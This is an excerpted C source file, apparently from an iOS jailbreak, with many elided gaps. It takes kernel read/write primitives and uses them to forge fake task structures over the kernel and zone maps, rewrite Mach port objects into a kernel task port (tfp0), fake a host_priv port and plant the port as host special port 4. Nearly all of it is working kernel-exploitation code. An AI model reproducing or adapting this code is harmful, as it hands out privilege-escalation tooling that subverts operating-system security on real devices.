...
uint64_t ipc_space_kernel1()
{
    return ReadKernel64(task_self_addr1() + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}
...
uint64_t make_fake_task(uint64_t vm_map) {
    ...
    *(uint32_t*)(fake_task + koffsetS3(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffsetS3(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffsetS3(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffsetS3(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
...
bool iterate_proc_list(void (^handler)(kptr_t, pid_t, bool *)) {
    ...
    while (KERN_POINTER_VALID(proc) && iterate) {
        pid_t const pid = ReadKernel32(proc + koffsetS3(KSTRUCT_OFFSET_PROC_PID));
        handler(proc, pid, &iterate);
        if (!iterate) break;
        proc = ReadKernel64(proc + koffsetS3(KSTRUCT_OFFSET_PROC_P_LIST) + sizeof(kptr_t));
    }
    ret = true;
out:;
    return ret;
...
uint64_t get_proc_struct_for_pid1(pid_t pid)
{
...
uint64_t get_address_of_port1(pid_t pid, mach_port_t port)
{
    uint64_t proc_struct_addr = get_proc_struct_for_pid1(pid);
    uint64_t task_addr = ReadKernel64(proc_struct_addr + OFFSET(proc, task));
    printf("task_addr = 0x%llx\n",task_addr);

    uint64_t itk_space = ReadKernel64(task_addr + OFFSET(task, itk_space));
    uint64_t is_table = current_is_table;//ReadKernel64(itk_space + OFFSET(ipc_space, is_table));//ReadKernel64(itk_space + koffsetS3(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
...
void convert_port_to_task_port1(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = get_address_of_port1(getpid(), port);
    
    WriteKernel32(port_kaddr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    WriteKernel32(port_kaddr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    WriteKernel32(port_kaddr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    WriteKernel64(port_kaddr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    WriteKernel64(port_kaddr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr1();
...
void make_port_fake_task_port1(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel1(), task_kaddr);
}
...
void set_all_image_info_addr(uint64_t kernel_task_kaddr, uint64_t all_image_info_addr) {
    ...
    if (dyld_info.all_image_info_addr != all_image_info_addr) {
        ...
        WriteKernel64(kernel_task_kaddr + koffsetS3(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), all_image_info_addr);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
...
void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info_size) {
    ...
    if (dyld_info.all_image_info_size != all_image_info_size) {
        ...
        WriteKernel64(kernel_task_kaddr + koffsetS3(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
...
#define IKOT_HOST_PRIV 4
    ...
    uint64_t host_kaddr = get_address_of_port1(getpid(), host);
...
mach_port_t FakeHostPriv() {
    ...
    uint64_t hostport_addr = get_address_of_port1(getpid(), mach_host_self());
    uint64_t realhost = ReadKernel64(hostport_addr + koffsetS3(KSTRUCT_OFFSET_PROC_TASK));
    ...
    // locate the port
    uint64_t port_addr = get_address_of_port1(getpid(), port);
    
    // change the space of the port
    WriteKernel64(port_addr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel1());
    
    // set the kobject
    WriteKernel64(port_addr +koffsetS3(KSTRUCT_OFFSET_PROC_TASK), realhost);
...
int setHSP4() {
    ...
    uint64_t kernel_task_kaddr = rk64SP(GETOFFSET(kernel_task));
    ...
    uint64_t zone_map = rk64SP(zone_map_kptr);
    
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = rk64SP(kernel_task_kaddr + koffsetS3(KSTRUCT_OFFSET_TASK_VM_MAP));
    
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    
    make_port_fake_task_port1(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port1(km_fake_task_port, km_fake_task_kptr);
    ...
    make_port_fake_task_port1(*port, remapped_task_addr);
    
    if (rk64SP(port_kaddr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
    ...
    uint64_t host_priv_kaddr = get_address_of_port1(getpid(), mach_host_self());
    uint64_t realhost_kaddr = rk64SP(host_priv_kaddr + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    wk64SP(realhost_kaddr + off_host_special + 4 * sizeof(void*), port_kaddr);
